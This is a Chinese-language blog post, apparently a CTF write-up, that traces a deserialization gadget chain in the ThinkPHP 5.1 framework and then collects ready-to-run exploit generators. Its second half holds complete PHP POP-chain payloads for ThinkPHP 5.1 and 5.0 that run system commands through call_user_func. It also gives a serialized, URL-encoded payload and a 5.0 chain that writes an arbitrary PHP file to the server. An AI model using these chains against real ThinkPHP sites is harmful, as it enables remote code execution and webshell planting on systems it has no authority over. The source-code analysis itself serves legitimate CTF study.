---
title: thinkphp框架的反序列化漏洞
abbrlink: d059616f
date: 2022-10-30 17:52:12
description: ''
cover: false
tags:
  - CTF-Web
categories:
  - CTF
  - Web安全
typora-root-url: ..
---

整个过程还没有完全看明白,有一点是一点先记下来吧

题目:BUUCTFhttps://buuoj.cn/challenges,  N1BOOK,[第三章 web进阶]thinkphp反序列化利用链

# thinkphp5.1,利用过程分析



进来直接有个链接可以下载源码,是完整的`thinkphp`框架源码

既然考点是反序列化,那么使用IDE打开整个目录,然后全局搜索`__destruct`:

<img src="/images/thinkphp-unserialize/image-20221030161605310.png" alt="image-20221030161605310" style="zoom:80%;" />

这里跟进到`Windows.php`下的这个`__destruct`方法:

```php
namespace think\process\pipes; //声明以下代码都在这个命名空间下
//命名空间解决:用户编写的代码与PHP内部的类/函数/常量或第三方类/函数/常量之间的名字冲突。
//命名空间也支持指定层次化的命名空间的名称,就像目录一样

use think\Process;   //use用于将process这个类导入进来
class Windows extends Pipes
{

    /** @var array */
    private $files = [];
    /** @var array */
    private $fileHandles = [];
    /** @var array */
    private $readBytes = [
        Process::STDOUT => 0,
        Process::STDERR => 0,
    ];
    /** @var bool */
    private $disableOutput;
    
    public function __destruct()
    {
        $this->close();
        $this->removeFiles(); 
    }
```

这里可以看到`__destruct`调用了同一个类下的`removefiles`方法,那么接下来定位到这个方法:

```php
    private function removeFiles()
    {
        foreach ($this->files as $filename) {
            if (file_exists($filename)) {
                @unlink($filename);  //如果文件存在,则会删除它
            }
        }
        $this->files = [];
    }
/*
这里遍历了类属性file,这是一个数组,里面的元素是文件名
这里检验了这个文件是否存在
注意这里要素察觉, 调用file_exists函数时,会将filename作为字符串
那么站在反序列化的角度上,可以再去找一个有__tostring方法的类,将filename指定为这个类的对象
这样调用file_exists函数时就可以触发这个类的__tostring方法
*/
```

那么接下来去全局搜索`__tostring`,定位到`conversion`这个类:



```php
    public function __toString()
    {
        return $this->toJson();
    }
```

这里调用了同一个类的`toJson`方法,继续跟进:

```php
    public function toJson($options = JSON_UNESCAPED_UNICODE)
    {
        return json_encode($this->toArray(), $options);
    }

```

这里将`toArray`的返回值进行`json`的编码,继续跟进`toArray`

```php
public function toArray()
    {
//..............省略若干行

        // 追加属性（必须定义获取器）
        if (!empty($this->append)) { //这里需要当前类有个append属性非空,所以需要构造这个属性
            foreach ($this->append as $key => $name) { //append属性是键值对的形式
                if (is_array($name)) {  //这个键值对中的值,也就是name,为数组
// 将键传入getRelation函数,返回relation的值
                    $relation = $this->getRelation($key);

                    if (!$relation) {   //这里需要relation的值为空才能向下进行
                        $relation = $this->getAttr($key);
                        if ($relation) {
                            $relation->visible($name);
                        }
                    }

//.........省略若干行
```

先去寻找`getRelation`这个函数: 全局搜索后定位到`RelationShip.php`

```php
    public function getRelation($name = null) //这里的形参为name,实际上也就是toArray中我们传入的key
    {
        if (is_null($name)) {
            return $this->relation;
        } elseif (array_key_exists($name, $this->relation)) { //检查names是否在$this->relation的键中
            return $this->relation[$name];
        }
        return; //因为上一步中需要让relation的值为空,所以需要在这里返回
    }
```

既然要让`getRelation`在第三个`return`处返回,那么前两个`if`都不可以成立

第一个`if`: 要求传进来的`name`,也就是上一步的`key`不能为空

第二个`if`,要求`name`不能再数组`$this->relation`中,往前找发现这是个空数组,所以无所谓

```
private $relation = [];
```



现在回到`toArray`这里,继续往下走代码

```php
public function toArray()
    {
//..............省略若干行

        // 追加属性（必须定义获取器）
        if (!empty($this->append)) { //这里需要当前类有个append属性非空,所以需要构造这个属性
            foreach ($this->append as $key => $name) { //append属性是键值对的形式
                if (is_array($name)) {  //这个键值对中的值,也就是name,为数组
// 将键传入getRelation函数,返回relation的值
                    $relation = $this->getRelation($key);

                    if (!$relation) {   //这里需要relation的值为空才能向下进行
                        $relation = $this->getAttr($key);
                        if ($relation) {
                            $relation->visible($name);
                        }
                    }

//.........省略若干行
```

接下来调用了`$this->getAttr($key);`, 全局搜索它,发现在`Attribute.php`的`Attribute`类中:

```php
public function getAttr($name, &$item = null)
    {
        try {
            $notFound = false;
            $value    = $this->getData($name);
        } catch (InvalidArgumentException $e) {
            $notFound = true;
            $value    = null;
        }

        // 检测属性获取器
        $fieldName = Loader::parseName($name);
        $method    = 'get' . Loader::parseName($name, 1) . 'Attr';

        if (isset($this->withAttr[$fieldName])) {
            if ($notFound && $relation = $this->isRelationAttr($name)) {
                $modelRelation = $this->$relation();
                $value         = $this->getRelationData($modelRelation);
            }

            $closure = $this->withAttr[$fieldName];
            $value   = $closure($value, $this->data);
        } elseif (method_exists($this, $method)) {
            if ($notFound && $relation = $this->isRelationAttr($name)) {
                $modelRelation = $this->$relation();
                $value         = $this->getRelationData($modelRelation);
            }

            $value = $this->$method($value, $this->data);
        } elseif (isset($this->type[$name])) {
            // 类型转换
            $value = $this->readTransform($value, $this->type[$name]);
        } elseif ($this->autoWriteTimestamp && in_array($name, [$this->createTime, $this->updateTime])) {
            if (is_string($this->autoWriteTimestamp) && in_array(strtolower($this->autoWriteTimestamp), [
                'datetime',
                'date',
                'timestamp',
            ])) {
                $value = $this->formatDateTime($this->dateFormat, $value);
            } else {
                $value = $this->formatDateTime($this->dateFormat, $value, true);
            }
        } elseif ($notFound) {
            $value = $this->getRelationAttribute($name, $item);
        }

        return $value;   
    }

```

此函数最后返回`value`,而在第二行就有:`$value    = $this->getData($name);`

这里传进来的`name`还是上一步中的那个`key` , 现在继续跟进到`getData`,这个函数就在当前的类中:

```php
    public function getData($name = null)
    {
        if (is_null($name)) {
            return $this->data;
        } elseif (array_key_exists($name, $this->data)) {
            return $this->data[$name];
        } elseif (array_key_exists($name, $this->relation)) {
            return $this->relation[$name];
        }
        throw new InvalidArgumentException('property not exists:' . static::class . '->' . $name);
    }

//前面getRelation那里已经分析出来,key是不能为空的,所以这里跳过第一个if
//到第二个,elseif,这里如果传进来的key在data中,那么就根据这个键来在data中返回相应的值
//这样我们就可以在这个类中构造data属性,它是键值对的形式,其中有键和key是相对应的

//那么，第三个if中，relation为什么不能构造了？
//因为上面说到getRelation()函数要返回空，所以array_key_exists($name, $this->relation)必须为false
```

所以总结一下`relation`的赋值过程:

```
$relation = $this->getAttr($key) = $this->getData($name) = $this->data[$name]
这里name也就是Conversion中,$this->append 这个数组的一个键key
即:
$relation =$this->data[$key]
```

继续回到最初的`toArray`这里,继续往下走代码:

```php
public function toArray()
    {
//..............省略若干行

        // 追加属性（必须定义获取器）
        if (!empty($this->append)) { //这里需要当前类有个append属性非空,所以需要构造这个属性
            foreach ($this->append as $key => $name) { //append属性是键值对的形式
                if (is_array($name)) {  //这个键值对中的值,也就是name,为数组
// 将键传入getRelation函数,返回relation的值
                    $relation = $this->getRelation($key);

                    if (!$relation) {   //这里需要relation的值为空才能向下进行
                        $relation = $this->getAttr($key);
                        if ($relation) {
                            $relation->visible($name);
                        }
                    }

//.........省略若干行
```

接下来当`$relation`的值传好之后, 调用了`$relation->visible($name);` 

可以看到这里调用了`$relation`这个对象的`visible`方法

如果这个方法不存在,就会调用`__call()`函数,并且把这里的参数`name`和函数名`visible`作为参数传给`__call()`

那么现在一方面需要`$relation`,也就是`$this->data[$key]` 是这个具有`__call()`方法的类的对象

另一方面需要去寻找这个有`__call()`方法的类

这里通过全局搜索定位到`request.php`的`Request`类

```php
//这里传过来的参数是前面不存在的函数visible,以及其参数name,也就是append数组中刚刚讨论了很久的key键对应的值
public function __call($method, $args)
    {
        if (array_key_exists($method, $this->hook)) {
            array_unshift($args, $this); //在数组开头插入一个或多个单元
            return call_user_func_array($this->hook[$method], $args);
        }

        throw new Exception('method not exists:' . static::class . '->' . $method);
    }
//这里还看到了call_user_func_array函数,这里已经可以用来指向我们自定义的命令了
//然而这里array_unshift,直接将当前对象插入到了我们传进来的参数name(数组)中,导致其变得不可控
//这里$this->hook是一个数组,初始化时为空,call_user_func_array这里是将这里传入的$method作为键,然后去hook数组中寻找对应的值(函数),然后执行它
//所以这里我们可以构建hook,让它中包含一个键值对:   method(visible):我们想到执行的函数
```

继续寻找可以执行命令的函数,搜索一下`call_user_func()`,直接在当前文件`request.php`搜索到了, 在`filterValue`方法中

```php
    private function filterValue(&$value, $key, $filters)
    {
        $default = array_pop($filters);

        foreach ($filters as $filter) {
            if (is_callable($filter)) {
                // 调用函数或者方法过滤
                $value = call_user_func($filter, $value);
            } elseif (is_scalar($value)) {
                if (false !== strpos($filter, '/')) {
                    // 正则过滤
                    if (!preg_match($filter, $value)) {
                        // 匹配不成功返回默认值
                        $value = $default;
                        break;
                    }
                } elseif (!empty($filter)) {
                    // filter函数不存在时, 则使用filter_var进行过滤
                    // filter为非整形值时, 调用filter_id取得过滤id
                    $value = filter_var($value, is_int($filter) ? $filter : filter_id($filter));
                    if (false === $value) {
                        $value = $default;
                        break;
                    }
                }
            }
        }

        return $value;
    }
```











# 先来一点能够有用的吧



这里放一下网上大佬整理的调用链:

<img src="/images/thinkphp-unserialize/1.png" alt="image-20221030161605310" style="zoom:80%;" />

<img src="/images/thinkphp-unserialize/2.png" alt="image-20221030161605310" style="zoom:80%;" />

搜索打开网页后显示的文本`download code`来定位一下网页的入口点(**找一下怎样传入用于反序列化的字符串来触发反序列化**)

全局搜索后定位到:`application\index\controller\Index.php`

```php
<?php
namespace app\index\controller;

class Index
{
    public function index()
    {
		return "<a href='www.zip'>download code</a>";
    }

    public function hello()
    {
        echo "aaaaaaaa";
        echo "<br>";
        unserialize($_POST['str']);
    }
}
```

可以看到这里只要访问到`hello`,然后通过`POST`的`str`参数,把构造好的字符串传进去就可以了

再定位一下`thinkphp`的`route.php`:

```php
<?php
Route::get('think', function () {
    return 'hello,ThinkPHP5!';
});

Route::get('hello/:name', 'index/hello');

return [

];
```



通过给s传参来访问到`hello`这个路由: 然后在这个页面POST给`str`传参就行了,然后在get中通过下面自定义的`ethan`来传需要执行的命令

![image-20221030201059612](/images/thinkphp-unserialize/image-20221030201059612.png)



最后的`exp`:

<span style='color:black;background:yellow;font-family:hei;font-weight:bold'>因为调用链中的Conversion是一个trait复用类,不能被实例化,所以需要找一个user了它的类,即找到Model类,但是Model是一个abstract抽象类,也不能被实例化,所以要找一个继承它的,这才找到了Pivot类. 因为有这层继承关系,Pivot类也use了Conversion类</span>

```php
<?php
namespace think;
abstract class Model{
    protected $append = [];
    private $data = [];
    function __construct(){
        $this->append = ["ethan"=>["calc.exe","calc"]];
        $this->data = ["ethan"=>new Request()];
    }
}
class Request
{
    protected $hook = [];
    protected $filter = "system";
    protected $config = [
        // 表单请求类型伪装变量
        'var_method'       => '_method',
        // 表单ajax伪装变量
        'var_ajax'         => '_ajax',
        // 表单pjax伪装变量
        'var_pjax'         => '_pjax',
        // PATHINFO变量名 用于兼容模式
        'var_pathinfo'     => 's',
        // 兼容PATH_INFO获取
        'pathinfo_fetch'   => ['ORIG_PATH_INFO', 'REDIRECT_PATH_INFO', 'REDIRECT_URL'],
        // 默认全局过滤方法 用逗号分隔多个
        'default_filter'   => '',
        // 域名根，如thinkphp.cn
        'url_domain_root'  => '',
        // HTTPS代理标识
        'https_agent_name' => '',
        // IP代理获取标识
        'http_agent_ip'    => 'HTTP_X_REAL_IP',
        // URL伪静态后缀
        'url_html_suffix'  => 'html',
    ];
    function __construct(){
        $this->filter = "system";
        $this->config = ["var_ajax"=>''];
        $this->hook = ["visible"=>[$this,"isAjax"]];
    }
}
namespace think\process\pipes;

use think\model\concern\Conversion;
use think\model\Pivot;
class Windows
{
    private $files = [];

    public function __construct()
    {
        $this->files=[new Pivot()];
    }
}
namespace think\model;

use think\Model;

class Pivot extends Model
{
}
use think\process\pipes\Windows;
echo urlencode(serialize(new Windows()));
?>
```

运行生成字符串:

```
O%3A27%3A%22think%5Cprocess%5Cpipes%5CWindows%22%3A1%3A%7Bs%3A34%3A%22%00think%5Cprocess%5Cpipes%5CWindows%00files%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00append%22%3Ba%3A1%3A%7Bs%3A5%3A%22ethan%22%3Ba%3A2%3A%7Bi%3A0%3Bs%3A8%3A%22calc.exe%22%3Bi%3A1%3Bs%3A4%3A%22calc%22%3B%7D%7Ds%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A5%3A%22ethan%22%3BO%3A13%3A%22think%5CRequest%22%3A3%3A%7Bs%3A7%3A%22%00%2A%00hook%22%3Ba%3A1%3A%7Bs%3A7%3A%22visible%22%3Ba%3A2%3A%7Bi%3A0%3Br%3A9%3Bi%3A1%3Bs%3A6%3A%22isAjax%22%3B%7D%7Ds%3A9%3A%22%00%2A%00filter%22%3Bs%3A6%3A%22system%22%3Bs%3A9%3A%22%00%2A%00config%22%3Ba%3A1%3A%7Bs%3A8%3A%22var_ajax%22%3Bs%3A0%3A%22%22%3B%7D%7D%7D%7D%7D%7D
```

成功执行命令:

![image-20221030201637462](/images/thinkphp-unserialize/image-20221030201637462.png)



<span style='color:black;background:yellow;font-family:hei;font-weight:bold'>实际操作中先用脚本吧, 只要找到具体题目对入口点做的修改,找到传参的地方就行了(全局搜索,关注`route.php`和`index.php`)</span>



这里再补充几个pop链

5.1:

```php
<?php
namespace think{
    abstract class Model{
        private $withAttr = [];
        private $data = [];
        public function __construct($function,$parameter){
            $this->data['smi1e'] = $parameter;
            $this->withAttr['smi1e'] = $function;
        }
    }
}

namespace think\model{
    use think\Model;
    class Pivot extends Model
    {}
}

namespace think\process\pipes{
    use think\model\Pivot;
    class Windows
    {
        private $files = [];
        public function __construct($function,$parameter){
            $this->files = [new Pivot($function,$parameter)];
        }
    }
    $function = 'system';
    $parameter = 'whoami';
    $aaa = new Windows($function,$parameter);
    echo base64_encode(serialize($aaa));
}
//利用链:__destruct()>>removeFiles>>file_exists>> __toString>>>toJson()>>>toArray()>>>getAttr()>>>$closure($value, $this->data)
```



thinkphp5.0: 命令执行

```php
<?php
namespace think\process\pipes{
    use think\model\Pivot;
    ini_set('display_errors',1);
    class Windows{
        private $files = [];
        public function __construct($function,$parameter)
        {
            $this->files = [new Pivot($function,$parameter)];
        }
    }
    $aaa = new Windows('system','whoami');
    echo base64_encode(serialize($aaa));
}
namespace think{
    abstract class Model
    {}
}
namespace think\model{
    use think\Model;
    use think\console\Output;
    class Pivot extends Model
    {
        protected $append = [];
        protected $error;
        public $parent;
        public function __construct($function,$parameter)
        {
            $this->append['jelly'] = 'getError';
            $this->error = new relation\BelongsTo($function,$parameter);
            $this->parent = new Output($function,$parameter);
        }
    }
    abstract class Relation
    {}
}
namespace think\model\relation{
    use think\db\Query;
    use think\model\Relation;
    abstract class OneToOne extends Relation
    {}
    class BelongsTo extends OneToOne
    {
        protected $selfRelation;
        protected $query;
        protected $bindAttr = [];
        public function __construct($function,$parameter)
        {
            $this->selfRelation = false;
            $this->query = new Query($function,$parameter);
            $this->bindAttr = [''];
        }
    }
}
namespace think\db{
    use think\console\Output;
    class Query
    {
        protected $model;
        public function __construct($function,$parameter)
        {
            $this->model = new Output($function,$parameter);
        }
    }
}
namespace think\console{
    use think\session\driver\Memcache;
    class Output
    {
        protected $styles = [];
        private $handle;
        public function __construct($function,$parameter)
        {
            $this->styles = ['getAttr'];
            $this->handle = new Memcache($function,$parameter);
        }
    }
}
namespace think\session\driver{
    use think\cache\driver\Memcached;
    class Memcache
    {
        protected $handler = null;
        protected $config  = [
            'expire'       => '',
            'session_name' => '',
        ];
        public function __construct($function,$parameter)
        {
            $this->handler = new Memcached($function,$parameter);
        }
    }
}
namespace think\cache\driver{
    use think\Request;
    class Memcached
    {
        protected $handler;
        protected $options = [];
        protected $tag;
        public function __construct($function,$parameter)
        {
            // pop链中需要prefix存在，否则报错
            $this->options = ['prefix'   => 'jelly/'];
            $this->tag = true;
            $this->handler = new Request($function,$parameter);
        }
    }
}
namespace think{
    class Request
    {
        protected $get     = [];
        protected $filter;
        public function __construct($function,$parameter)
        {
            $this->filter = $function;
            $this->get = ["jelly"=>$parameter];
        }
    }
}
/*
调用链:
Windows.php: think\process\pipes\Windows->__destruct()
Windows.php: think\process\pipes\Windows->removeFiles()
Windows.php: file_exists()
Model.php: think\model\Pivot->__toString()
Model.php: think\model\Pivot->toJson()
Model.php: think\model\Pivot->toArray()
Model.php: $value->getAttr()
Output.php: think\console\Output->__call()
Output.php: think\console\Output->block()
Output.php: think\console\Output->writlen()
Output.php: think\console\Output->write()
Output.php: think\console\Output->handle->write()
Memcache.php: think\session\driver\Memcache->write()
Memcache.php: think\session\driver\Memcache->handle->set()
Memcached.php: think\cache\driver\Memcached->set()
Memcached.php: think\cache\driver\Memcached->has()
Memcached.php: think\cache\driver\Memcached->handler->get()
Request.php: think\Request->get()
Request.php: think\Request->input()
Request.php: think\Request->filterValue()
Request.php: call_user_func($filter, $value)
*/
```

thinkphp5.0,文件写入:

```php
//最终将会执行：file_put_contents($path, $data);
//该pop链上传的文件名将会固定
<?php
namespace think\process\pipes{
    use think\model\Pivot;
    use think\cache\driver\Memcached;
    class Windows{
        private $files = [];
        public function __construct($path,$data)
        {
            $this->files = [new Pivot($path,$data)];
        }
    }
    $data = base64_encode('<?php phpinfo();?>');  
    //写入文件的内容. 这里只需要检查编码后的内容是否存在等号，尽量构造一个无等号的$data
    echo "tp5.0.24 write file pop Chain\n";
    echo "The '=' cannot exist in the data,please check：".$data."\n";
    $path = 'php://filter/convert.base64-decode/resource=./';
    //$path最好就固定为下面所示的过滤器，且读取目录是当前目录，目的是为了让文件名固定
    $aaa = new Windows($path,$data);
    echo base64_encode(serialize($aaa));
    echo "\n";
    echo 'filename:'.md5('tag_'.md5(true)).'.php';
}
namespace think{
    abstract class Model
    {}
}
namespace think\model{
    use think\Model;
    class Pivot extends Model
    {
        protected $append = [];
        protected $error;
        public $parent;
        public function __construct($path,$data)
        {
            $this->append['jelly'] = 'getError';
            $this->error = new relation\BelongsTo($path,$data);
            $this->parent = new \think\console\Output($path,$data);
        }
    }
    abstract class Relation
    {}
}
namespace think\model\relation{
    use think\db\Query;
    use think\model\Relation;
    abstract class OneToOne extends Relation
    {}
    class BelongsTo extends OneToOne
    {
        protected $selfRelation;
        protected $query;
        protected $bindAttr = [];
        public function __construct($path,$data)
        {
            $this->selfRelation = false;
            $this->query = new Query($path,$data);
            $this->bindAttr = ['a'.$data];
        }
    }
}
namespace think\db{
    use think\console\Output;
    class Query
    {
        protected $model;
        public function __construct($path,$data)
        {
            $this->model = new Output($path,$data);
        }
    }
}
namespace think\console{
    use think\session\driver\Memcache;
    class Output
    {
        protected $styles = [];
        private $handle;
        public function __construct($path,$data)
        {
            $this->styles = ['getAttr'];
            $this->handle = new Memcache($path,$data);
        }
    }
}
namespace think\session\driver{
    use think\cache\driver\File;
    use think\cache\driver\Memcached;
    class Memcache
    {
        protected $handler = null;
        protected $config  = [
            'expire'       => '',
            'session_name' => '',
        ];
        public function __construct($path,$data)
        {
            $this->handler = new Memcached($path,$data);
        }
    }
}
namespace think\cache\driver{
    class Memcached
    {
        protected $handler;
        protected $tag;
        protected $options = [];
        public function __construct($path,$data)
        {
            $this->options = ['prefix'   => ''];
            $this->handler = new File($path,$data);
            $this->tag = true;
        }
    }
}
namespace think\cache\driver{
    class File
    {
        protected $options = [];
        protected $tag;
        public function __construct($path,$data)
        {
            $this->tag = false;
            $this->options = [
                'expire'        => 0,
                'cache_subdir'  => false,
                'prefix'        => '',
                'path'          => $path,
                'data_compress' => false,
            ];
        }
    }
}
```





来自:https://www.freebuf.com/vuls/317886.html
